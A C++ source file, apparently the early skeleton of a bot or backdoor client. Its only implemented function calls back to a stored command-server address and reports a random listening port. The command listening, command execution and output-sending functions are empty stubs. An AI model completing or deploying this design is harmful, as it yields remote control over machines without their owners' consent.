#include <bot.hpp>
#include <random>
#include <string>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>


Bot::Bot(const sockaddr_in* cbaddr) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> distrib(30000, 50000);

    m_cmfd = -1;
    m_lisfd = -1;
    m_cmport = distrib(gen);
    m_cbaddr = *cbaddr;
}

int Bot::callback() {
    int res;
    int sockfd;
    std::string port = std::to_string(m_cmport);
    
    res = socket(AF_INET, SOCK_STREAM, 0);
    if (res == -1) {
        return -1;
    }
    sockfd = res;

    res = connect(sockfd, (sockaddr*)&m_cbaddr, (socklen_t) sizeof(m_cbaddr));
    if (res == -1) {
        return -1;
    }

    res = send(sockfd, port.c_str(), port.size(), 0);
    if (res == -1) {
        return -1;
    }

    res = close(sockfd);
    if (res == -1) {
        return -1;
    }

    return 0;
}

int Bot::start_listener() {return 0;}
int Bot::command_handler() {return 0;}
int Bot::get_command() {return 0;}
int Bot::execute_command() {return 0;}
int Bot::send_output() {return 0;}
bool Bot::is_connected() {return false;}